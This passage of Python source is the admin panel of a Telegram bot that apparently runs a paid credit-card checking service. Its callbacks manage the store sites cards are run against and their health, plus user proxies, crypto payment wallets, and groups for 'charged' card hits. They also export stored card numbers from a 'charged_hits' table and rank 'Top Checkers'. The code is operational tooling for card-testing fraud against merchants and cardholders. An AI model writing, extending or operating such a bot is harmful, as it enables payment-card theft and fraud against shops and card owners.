    _pub_gc = get_setting("public_gc_id"); _fb_ch = get_setting("fb_channel_id")
    targets = list(dict.fromkeys(t for t in [_pub_gc, _fb_ch] if t))
    if not targets: return await cb.answer("Configure Public GC and/or FB Channel first", show_alert=True)
    text = f"{pe('glow_star')} <b>OFFICIAL FEEDBACK</b>\n<blockquote>{pe('user')} <b>User:</b> @{esc(r['username'] or str(r['uid']))}\n{pe('pen')} <b>Dev:</b> {dev_link()}</blockquote>\n<blockquote>{esc(r['text'][:800]) if r['text'] else 'Media content'}</blockquote>"
    sent, failed = 0, 0
    for target in targets:
        try:
            tgt = int(target) if re.fullmatch(r"-?\d+", target) else target
            if r["msg_type"] == "text": await _bot_ref.send_message(tgt, text, parse_mode="HTML")
            elif r["msg_type"] == "photo": await _bot_ref.send_photo(tgt, r["file_id"], caption=text, parse_mode="HTML")
            elif r["msg_type"] == "doc": await _bot_ref.send_document(tgt, r["file_id"], caption=text, parse_mode="HTML")
            elif r["msg_type"] == "video": await _bot_ref.send_video(tgt, r["file_id"], caption=text, parse_mode="HTML")
            elif r["msg_type"] == "animation": await _bot_ref.send_animation(tgt, r["file_id"], caption=text, parse_mode="HTML")
            sent += 1
        except: failed += 1
    try: await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await cb.answer(f"Sent {sent}/{len(targets)}" if failed == 0 else f"Sent {sent}/{len(targets)} ({failed} failed)", show_alert=failed > 0)

@router.callback_query(F.data.startswith("fb_rej:"))
async def cb_fb_rej(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Not allowed", show_alert=True)
    with db() as c: c.execute("DELETE FROM feedback WHERE id=?", (cb.data.split(":")[1],))
    try: await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await cb.answer("Rejected")

@router.callback_query(F.data == "verify_sub")
async def cb_verify(cb: CallbackQuery):
    if await check_force_sub(cb.bot, cb.from_user.id):
        try: await cb.message.delete()
        except: pass
        apply_streak(cb.from_user.id)
        user = get_user_or_create(cb.from_user.id, cb.from_user.username or "")
        caption = welcome_text(user, cb.from_user.first_name)
        try: await cb.bot.send_photo(chat_id=cb.from_user.id, photo=IMG_MAIN, caption=caption, parse_mode="HTML", reply_markup=main_menu_kb(cb.from_user.id))
        except: pass
    else: await cb.answer("Join all channels first", show_alert=True)
    try: await cb.answer()
    except: pass

# ── Admin callbacks ──────────────────────────────────────────────────────────
@router.callback_query(F.data == "menu:admin_panel")
@router.callback_query(F.data == "admin:main")
async def cb_admin_main(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("Not admin", show_alert=True)
    set_awaiting(cb.from_user.id, '')
    text = f"{hdr('ADMIN PANEL', 'settings')}\n<blockquote>{pe('user')} <b>{BOT_BRAND}</b></blockquote>"
    await edit_admin(cb, text, admin_main_kb(cb.from_user.id), photo=IMG_ADMIN)
    await cb.answer()

@router.callback_query(F.data == "admin:toggle_load")
async def cb_admin_toggle_load_vps(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    if not HAS_NODE_CLIENT: return await cb.answer("node_client.py not loaded", show_alert=True)
    new = not load_handling_vps_on()
    set_setting("load_handling", "1" if new else "0")
    await cb.answer(f"VPS LB: {'ON' if new else 'OFF'}", show_alert=True)
    await cb_admin_main(cb)

@router.callback_query(F.data == "admin:toggle_load_heroku")
async def cb_admin_toggle_load_heroku(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    if not HAS_NODE_CLIENT: return await cb.answer("node_client.py not loaded", show_alert=True)
    new = not load_handling_heroku_on()
    set_setting("load_handling_heroku", "1" if new else "0")
    await cb.answer(f"Heroku LB: {'ON' if new else 'OFF'}", show_alert=True)
    await cb_admin_main(cb)

@router.callback_query(F.data == "admin:toggle_site_mode")
async def cb_toggle_site_mode(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    cur = get_setting("site_mode", "auto")
    set_setting("site_mode", "siteless" if cur == "auto" else "with_site" if cur == "siteless" else "auto")
    await cb.answer(f"Mode: {mode_label()}")
    await cb_admin_main(cb)

@router.callback_query(F.data == "admin:backup_now")
async def cb_admin_backup(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Admin only", show_alert=True)
    await cb.answer("Generating backup...")
    try: await cb.message.answer("Backup sent." if await send_backup(cb.from_user.id) else "Backup failed.")
    except: pass

@router.callback_query(F.data == "admin:restore")
async def cb_admin_restore(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Admin only", show_alert=True)
    set_awaiting(cb.from_user.id, "restore_backup")
    await edit_admin(cb, f"{pe('warn')} <b>Restore Database</b>\n<blockquote>Upload .sql / .txt / .gz backup\nor send all parts (auto-completes)</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:set_public")
async def cb_admin_set_public(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_public")
    await edit_admin(cb, f"{pe('chat')} <b>{sc('Send Public GC ID')}</b>\n<blockquote>Send <code>off</code> to disable</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:set_fb_channel")
async def cb_admin_set_fb_channel(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_fb_channel")
    await edit_admin(cb, f"{pe('msg')} <b>{sc('FB Public Channel')}</b>\n<blockquote>Send channel ID or @username\n<code>off</code> to disable</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:set_max_price")
async def cb_admin_set_max_price(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_max_price")
    await edit_admin(cb, f"{pe('shop')} <b>{sc('Max Site Price')}</b>\n<blockquote>Current: <b>${get_setting('site_max_price', '3.0')}</b></blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:star_pricing")
async def cb_admin_star_pricing(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Admin only", show_alert=True)
    rows = []
    for key, p in PLANS.items():
        if p["stars"] == 0: continue
        cur = get_star_price(key)
        rows.append([pbtn(f"{p['name']}  ·  {cur}⭐", icon="star", color="success", callback_data=f"admin:set_star:{key}")])
    rows.append([pbtn(sc("Back"), icon="back", callback_data="admin:main")])
    text = f"{hdr('STAR PRICING', 'star')}\n<blockquote>{sc('Tap a plan to edit its star price')}</blockquote>"
    await edit_admin(cb, text, InlineKeyboardMarkup(inline_keyboard=rows))
    await cb.answer()

@router.callback_query(F.data.startswith("admin:set_star:"))
async def cb_admin_set_star(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Admin only", show_alert=True)
    plan_key = cb.data.split(":")[-1]
    set_awaiting(cb.from_user.id, f"set_star:{plan_key}")
    await edit_admin(cb, f"{pe('star')} <b>{sc('Set star price')}</b> · {plan_key}\n<blockquote>Current: <b>{get_star_price(plan_key)}⭐</b>\nSend new value</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:star_pricing")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:crypto")
async def cb_admin_crypto(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Admin only", show_alert=True)
    w = get_crypto_wallets()
    rows = []
    labels = {"btc": "BTC", "usdt_trc20": "USDT (TRC20)", "eth": "ETH", "ltc": "LTC"}
    for k, lbl in labels.items():
        val = w.get(k, "") or ""
        disp = (val[:20] + "…") if len(val) > 20 else (val or sc("not set"))
        rows.append([pbtn(f"{lbl} · {disp}", icon="gem", color="success" if val else "primary", callback_data=f"admin:set_crypto:{k}")])
    rows.append([pbtn(sc("Back"), icon="back", callback_data="admin:main")])
    body = (
        f"{hdr('CRYPTO WALLETS', 'gem')}\n"
        f"<blockquote>{sc('Tap to edit · send off to clear')}</blockquote>"
    )
    await edit_admin(cb, body, InlineKeyboardMarkup(inline_keyboard=rows))
    await cb.answer()

@router.callback_query(F.data.startswith("admin:set_crypto:"))
async def cb_admin_set_crypto(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Admin only", show_alert=True)
    wallet = cb.data.split(":")[-1]
    set_awaiting(cb.from_user.id, f"set_crypto:{wallet}")
    cur = get_crypto_wallets().get(wallet, "")
    body = (
        f"{pe('gem')} <b>{sc('Set wallet')}</b> · {wallet.upper()}\n"
        f"<blockquote>Current: <code>{esc(cur or 'not set')}</code>\n"
        f"Send address, or send <code>off</code> to clear</blockquote>"
    )
    await edit_admin(cb, body, InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:crypto")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:set_jio_url")
async def cb_admin_set_jio(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Admin only", show_alert=True)
    set_awaiting(cb.from_user.id, "set_jio_url")
    await edit_admin(cb, f"{pe('link')} <b>{sc('Jio API URL')}</b>\n<blockquote>Current: <code>{esc(get_jio_url())}</code>\nSend new URL</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:close")
async def cb_admin_close(cb: CallbackQuery):
    try: await cb.message.delete()
    except: pass
    await cb.answer()

@router.callback_query(F.data == "admin:toggle_maint")
async def cb_admin_toggle_maint(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    new = "1" if get_setting("maintenance") == "0" else "0"
    set_setting("maintenance", new)
    await cb.answer(f"Maint: {'ON' if new=='1' else 'OFF'}")
    await cb_admin_main(cb)

@router.callback_query(F.data == "admin:gc")
async def cb_admin_gc(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Admin only", show_alert=True)
    gc_id, gc_name = get_setting("charged_gc_id"), get_setting("charged_gc_name") or ""
    if not gc_id:
        return await edit_admin(cb, f"{pe('msg')} <b>{sc('Charged GC')}</b>\n<blockquote>No GC configured</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Set by forward"), icon="forward", color="success", callback_data="admin:gc_set_fwd")], [pbtn(sc("Set by chat id"), icon="pen", color="success", callback_data="admin:gc_set_id")], [pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    title, link, err = gc_name or gc_id, "", ""
    try:
        chat = await _bot_ref.get_chat(int(gc_id) if re.fullmatch(r"-?\d+", gc_id) else gc_id)
        title = chat.title or title
        link = f"https://t.me/{chat.username}" if chat.username else chat.invite_link if chat.invite_link else (await _bot_ref.create_chat_invite_link(int(gc_id) if re.fullmatch(r"-?\d+", gc_id) else gc_id)).invite_link
        if title != gc_name: set_setting("charged_gc_name", title)
    except Exception as e: err = f"\n(fetch failed: {esc(str(e)[:80])})"
    rows = [[pbtn(f"Open {title[:30]}", icon="forward", color="success", url=link)]] if link else []
    rows.extend([[pbtn(sc("Change GC"), icon="pen", callback_data="admin:gc_set_id")], [pbtn(sc("Remove GC"), icon="trash", color="danger", callback_data="admin:gc_rm")], [pbtn(sc("Back"), icon="back", callback_data="admin:main")]])
    await edit_admin(cb, f"{pe('msg')} <b>{sc('Charged GC')}</b>\n<blockquote>Name: <b>{esc(title)}</b>\nID: <code>{esc(gc_id)}</code>{err}</blockquote>", InlineKeyboardMarkup(inline_keyboard=rows))
    await cb.answer()

@router.callback_query(F.data == "admin:gc_set_fwd")
async def cb_admin_gc_set_fwd(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "gc_set")
    await edit_admin(cb, f"{pe('forward')} <b>Set GC by forward</b>\n<blockquote>Forward any message from the GC</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:gc")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:gc_set_id")
async def cb_admin_gc_set_id(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "gc_set")
    await edit_admin(cb, f"{pe('pen')} <b>Set GC by id</b>\n<blockquote>Send GC chat id\n<code>-1001234567890</code></blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:gc")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:gc_rm")
async def cb_admin_gc_rm(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_setting("charged_gc_id", ""); set_setting("charged_gc_name", "")
    await cb.answer("GC removed", show_alert=True)
    await cb_admin_main(cb)

@router.callback_query(F.data == "admin:pvt_file_gc")
async def cb_admin_pvt_file_gc(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Admin only", show_alert=True)
    gc_id = get_setting("pvt_file_gc_id")
    if not gc_id: return await edit_admin(cb, f"{pe('docs')} <b>Pvt File GC</b>\n<blockquote>Not configured</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Set"), icon="pen", color="success", callback_data="admin:pvt_file_gc_id")], [pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await edit_admin(cb, f"{pe('docs')} <b>Pvt File GC</b>\n<blockquote>ID: <code>{esc(gc_id)}</code></blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Change"), icon="pen", callback_data="admin:pvt_file_gc_id")], [pbtn(sc("Remove"), icon="trash", color="danger", callback_data="admin:pvt_file_gc_rm")], [pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:pvt_file_gc_id")
async def cb_admin_pvt_file_gc_id(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "pvt_file_gc_set")
    await edit_admin(cb, f"{pe('pen')} <b>Set Pvt File GC</b>\n<blockquote>Send chat id</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:pvt_file_gc")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:pvt_file_gc_rm")
async def cb_admin_pvt_file_gc_rm(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_setting("pvt_file_gc_id", ""); set_setting("pvt_file_gc_name", "")
    await cb.answer("Removed", show_alert=True)
    await cb_admin_main(cb)

@router.callback_query(F.data == "admin:pvt_cc_gc")
async def cb_admin_pvt_cc_gc(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Admin only", show_alert=True)
    gc_id = get_setting("pvt_cc_gc_id")
    if not gc_id: return await edit_admin(cb, f"{pe('gem')} <b>Pvt CC GC</b>\n<blockquote>Not configured</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Set"), icon="pen", color="success", callback_data="admin:pvt_cc_gc_id")], [pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await edit_admin(cb, f"{pe('gem')} <b>Pvt CC GC</b>\n<blockquote>ID: <code>{esc(gc_id)}</code></blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Change"), icon="pen", callback_data="admin:pvt_cc_gc_id")], [pbtn(sc("Remove"), icon="trash", color="danger", callback_data="admin:pvt_cc_gc_rm")], [pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:pvt_cc_gc_id")
async def cb_admin_pvt_cc_gc_id(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "pvt_cc_gc_set")
    await edit_admin(cb, f"{pe('pen')} <b>Set Pvt CC GC</b>\n<blockquote>Send chat id</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:pvt_cc_gc")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:pvt_cc_gc_rm")
async def cb_admin_pvt_cc_gc_rm(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_setting("pvt_cc_gc_id", ""); set_setting("pvt_cc_gc_name", "")
    await cb.answer("Removed", show_alert=True)
    await cb_admin_main(cb)

@router.callback_query(F.data == "admin:charged_txt")
async def cb_admin_charged_txt(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Admin only", show_alert=True)
    with db() as c: rows = c.execute("SELECT cc FROM charged_hits ORDER BY id").fetchall()
    if not rows: return await cb.answer("No charged hits yet", show_alert=True)
    try: await cb.message.answer_document(BufferedInputFile("\n".join(r["cc"] for r in rows).encode("utf-8"), filename=f"charged_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"), caption=f"{pe('check')} <b>{len(rows)} charged</b>", parse_mode="HTML")
    except: pass
    await cb.answer()

@router.callback_query(F.data == "admin:charged_clear")
async def cb_admin_charged_clear(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c:
        n = c.execute("SELECT COUNT(*) as n FROM charged_hits").fetchone()["n"]
        c.execute("DELETE FROM charged_hits")
    await cb.answer(f"Cleared {n}", show_alert=True)

@router.callback_query(F.data == "admin:apis")
async def cb_admin_apis(cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID: return await cb.answer("Owner only", show_alert=True)
    eps = load_api_state()["endpoints"]
    lines = [f"{pe('settings')} <b>API Endpoints</b>\n<blockquote>{pe('settings')} Mode: <b>{mode_label()}</b>"]
    if not eps: lines.append("no apis configured")
    for i, ep in enumerate(eps): lines.append(f"{'✓' if ep.get('enabled', True) else '✗'} [{i}] <code>{esc(ep['url'][:50])}</code>")
    await edit_admin(cb, "\n".join(lines + ["</blockquote>"]), api_list_kb())
    await cb.answer()

@router.callback_query(F.data.startswith("admin:api_view:"))
async def cb_admin_api_view(cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID: return await cb.answer("Owner only", show_alert=True)
    try: idx = int(cb.data.split(":")[2])
    except: return await cb.answer("bad index", show_alert=True)
    st = load_api_state()
    if idx < 0 or idx >= len(st["endpoints"]): return await cb.answer("out of range", show_alert=True)
    ep = st["endpoints"][idx]
    sr = ep.get("site_required", False)
    text = f"{pe('settings')} <b>API [{idx}]</b>\n<blockquote>URL: <code>{esc(ep['url'])}</code>\nStyle: {esc(ep.get('style', 'params'))}\nSite: {'REQUIRED' if sr else 'SITELESS'}\nCap: {ep.get('cap', DEFAULT_WORKERS_CAP)}\nEnabled: {'YES' if ep.get('enabled', True) else 'NO'}</blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn(f"{'Disable' if ep.get('enabled', True) else 'Enable'}", icon="refresh", color="success", callback_data=f"admin:api_toggle:{idx}")], [pbtn(f"Site: {'REQUIRED' if sr else 'SITELESS'}", icon="shop", color="success", callback_data=f"admin:api_site_toggle:{idx}")], [pbtn(sc("Toggle Style"), icon="pen", callback_data=f"admin:api_style:{idx}")], [pbtn(sc("Remove"), icon="trash", color="danger", callback_data=f"admin:api_del:{idx}")], [pbtn(sc("Back"), icon="back", callback_data="admin:apis")]])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("admin:api_toggle:"))
async def cb_admin_api_toggle(cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID: return await cb.answer("Owner only", show_alert=True)
    try: idx = int(cb.data.split(":")[2])
    except: return
    st = load_api_state()
    if 0 <= idx < len(st["endpoints"]):
        st["endpoints"][idx]["enabled"] = not st["endpoints"][idx].get("enabled", True)
        save_api_state(st)
        await cb.answer("Toggled")
        await cb_admin_api_view(cb)

@router.callback_query(F.data.startswith("admin:api_site_toggle:"))
async def cb_admin_api_site_toggle(cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID: return await cb.answer("Owner only", show_alert=True)
    try: idx = int(cb.data.split(":")[2])
    except: return
    st = load_api_state()
    if 0 <= idx < len(st["endpoints"]):
        st["endpoints"][idx]["site_required"] = not st["endpoints"][idx].get("site_required", False)
        save_api_state(st)
        await cb.answer("Toggled")
        await cb_admin_api_view(cb)

@router.callback_query(F.data.startswith("admin:api_style:"))
async def cb_admin_api_style(cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID: return await cb.answer("Owner only", show_alert=True)
    try: idx = int(cb.data.split(":")[2])
    except: return
    st = load_api_state()
    if 0 <= idx < len(st["endpoints"]):
        st["endpoints"][idx]["style"] = "raw" if st["endpoints"][idx].get("style", "params") == "params" else "params"
        save_api_state(st)
        await cb.answer("Toggled")
        await cb_admin_api_view(cb)

@router.callback_query(F.data == "admin:api_add")
async def cb_admin_api_add(cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID: return await cb.answer("Owner only", show_alert=True)
    set_awaiting(cb.from_user.id, "api_add")
    await edit_admin(cb, f"{pe('add')} <b>Add API</b>\n<blockquote>Send: <code>URL [key=X] [style=raw|params] [site=yes|no] [cap=N]</code></blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:apis")]]))
    await cb.answer()

@router.callback_query(F.data.startswith("admin:api_del:"))
async def cb_admin_api_del(cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID: return await cb.answer("Owner only", show_alert=True)
    try: idx = int(cb.data.split(":")[2])
    except: return await cb.answer("bad index", show_alert=True)
    st = load_api_state()
    if 0 <= idx < len(st["endpoints"]):
        st["endpoints"].pop(idx)
        save_api_state(st)
        await cb.answer("removed")
        await cb_admin_apis(cb)

async def _render_sites_page(cb: CallbackQuery, page: int = 0):
    if not is_full_admin(cb.from_user.id): return
    sites = get_sites()
    try: health = json.loads(get_setting("site_health", "{}") or "{}")
    except: health = {}
    total_pages = max(1, (len(sites) + SITES_PER_PAGE - 1) // SITES_PER_PAGE)
    page = max(0, min(page, total_pages - 1))
    text = f"{pe('shop')} <b>Sites ({len(sites)})</b>\n<blockquote>Healthy: <b>{sum(1 for v in health.values() if v == 'ok')}</b>\nMode: <b>{mode_label()}</b>\nPage: <b>{page+1}/{total_pages}</b></blockquote>"
    await edit_admin(cb, text, sites_kb(page=page))
    await cb.answer()

@router.callback_query(F.data == "admin:sites")
async def cb_admin_sites(cb: CallbackQuery): await _render_sites_page(cb, 0)

@router.callback_query(F.data.startswith("admin:sites:"))
async def cb_admin_sites_page(cb: CallbackQuery):
    try: p = int(cb.data.split(":", 2)[2])
    except: p = 0
    await _render_sites_page(cb, p)

@router.callback_query(F.data == "admin:site_checker")
async def cb_admin_site_checker(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "site_check_input")
    await edit_admin(cb, f"{pe('check')} <b>Site Checker</b>\n<blockquote>Paste sites or reply to a .txt file</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:sites")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:add_site")
async def cb_admin_add_site(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "site_add")
    await edit_admin(cb, f"{pe('add')} <b>Add Site</b>\n<blockquote>Send URL e.g. <code>store.myshopify.com</code></blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:sites")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:add_sites_bulk")
async def cb_admin_add_sites_bulk(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "site_add_bulk")
    await edit_admin(cb, f"{pe('add')} <b>Bulk Add Sites</b>\n<blockquote>Paste sites or reply to a .txt file</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:sites")]]))
    await cb.answer()

@router.callback_query(F.data.startswith("admin:site_view:"))
async def cb_admin_site_view(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    try: idx = int(cb.data.split(":")[2])
    except: return await cb.answer("bad index", show_alert=True)
    sites = get_sites()
    if idx >= len(sites): return await cb.answer("site removed", show_alert=True)
    site = sites[idx]
    benched, left = _is_site_benched(site), max(0, int(_site_cooldown_until.get(site, 0) - time.time()))
    text = f"{pe('shop')} <b>Site #{idx+1}</b>\n<blockquote><code>{esc(site)}</code>\nBenched: <b>{'YES' if benched else 'NO'}</b></blockquote>"
    await edit_admin(cb, text, InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Reset"), icon="refresh", color="success", callback_data=f"admin:reset_fails:{idx}")], [pbtn(sc("Remove Site"), icon="trash", color="danger", callback_data=f"admin:remove_site:{idx}")], [pbtn(sc("Back"), icon="back", callback_data=f"admin:sites:{idx // SITES_PER_PAGE}")]]))
    await cb.answer()

@router.callback_query(F.data.startswith("admin:remove_site:"))
async def cb_admin_remove_site(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    try: idx = int(cb.data.split(":")[2])
    except: return
    sites = get_sites()
    if idx < len(sites): remove_site_db(sites[idx])
    await cb.answer("Site removed", show_alert=True)
    await _render_sites_page(cb, 0)

@router.callback_query(F.data.startswith("admin:reset_fails:"))
async def cb_admin_reset(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    try: idx = int(cb.data.split(":")[2])
    except: return
    sites = get_sites()
    if idx < len(sites): _site_fail_count[sites[idx]] = 0; _site_cooldown_until.pop(sites[idx], None)
    await cb.answer("Reset")
    await _render_sites_page(cb, 0)

@router.callback_query(F.data == "admin:health_refresh")
async def cb_admin_health(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    await cb.answer("Pinging...")
    sites = get_sites(); health = {}; sem = asyncio.Semaphore(8)
    async def ping(s):
        async with sem:
            try: res = await test_site(s, timeout=15); health[s] = "ok" if res.get("cls") not in ("error", "site_error", "rate_limited", "proxy_error", "timeout") else "down"
            except: health[s] = "down"
    await asyncio.gather(*(ping(s) for s in sites))
    async with _get_write_lock(): set_setting("site_health", json.dumps(health))
    await _render_sites_page(cb, 0)

@router.callback_query(F.data.startswith("admin:users:"))
async def cb_admin_users(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    try:
        page = int(cb.data.split(":")[2])
        kb, total, page = users_list_kb(page)
        await edit_admin(cb, f"{pe('user')} <b>Users</b> · Page {page+1}/{(total+9)//10 or 1}\n<blockquote>Total: <b>{total:,}</b></blockquote>", kb)
    except: pass
    await cb.answer()

@router.callback_query(F.data.startswith("admin:user_view:"))
async def cb_admin_user_view(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    try:
        target = int(cb.data.split(":")[2]); u = get_user(target)
        if not u: return await cb.answer("Not found", show_alert=True)
        with db() as c: proxies = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE uid=?", (target,)).fetchone()["n"]
        await edit_admin(cb, f"{pe('user')} <b>User {target}</b>\n<blockquote>@{esc(u['username'] or 'N/A')}\nPlan: <b>{u['plan']}</b>\nCredits: {u['credits']}\nChecks: {u['total_checks']:,} · Hits: {u['total_hits']:,}\nProxies: {proxies}\nBanned: {'YES' if u['banned'] else 'NO'}</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:users:0")]]))
    except: pass
    await cb.answer()

@router.callback_query(F.data == "admin:banned")
async def cb_admin_banned(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: rows = c.execute("SELECT uid, username FROM users WHERE banned=1 LIMIT 30").fetchall()
    if not rows: return await cb.answer("No banned", show_alert=True)
    await edit_admin(cb, "\n".join([f"{pe('warn')} <b>Banned</b>\n<blockquote>"] + [f"• <code>{r['uid']}</code> · @{esc(r['username'] or 'anon')}" for r in rows] + ["</blockquote>"]), admin_main_kb(cb.from_user.id))
    await cb.answer()

@router.callback_query(F.data == "admin:recent")
async def cb_admin_recent(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: rows = c.execute("SELECT cc, response, status FROM check_logs ORDER BY id DESC LIMIT 15").fetchall()
    if not rows: return await cb.answer("No checks yet", show_alert=True)
    await edit_admin(cb, "\n".join([f"{pe('docs')} <b>Recent</b>\n<blockquote>"] + [f"{pe('check') if r['status'] == 'HIT' else pe('cross2')} <code>{r['cc']}</code> · {esc(_sanitize_err(r['response'])[:25])}" for r in rows] + ["</blockquote>"]), InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:top")
async def cb_admin_top(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: rows = c.execute("SELECT uid, username, total_hits FROM users WHERE total_hits > 0 ORDER BY total_hits DESC LIMIT 10").fetchall()
    await edit_admin(cb, "\n".join([f"{pe('chart')} <b>Top Checkers</b>\n<blockquote>"] + [f"{i}. <b>{esc(r['username'] or r['uid'])}</b> · {r['total_hits']} hits" for i, r in enumerate(rows, 1)] + ["</blockquote>"]), InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:stats")
async def cb_admin_stats(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c:
        tu, today = c.execute("SELECT COUNT(*) as n FROM users").fetchone()["n"], datetime.now(timezone.utc).date().isoformat()
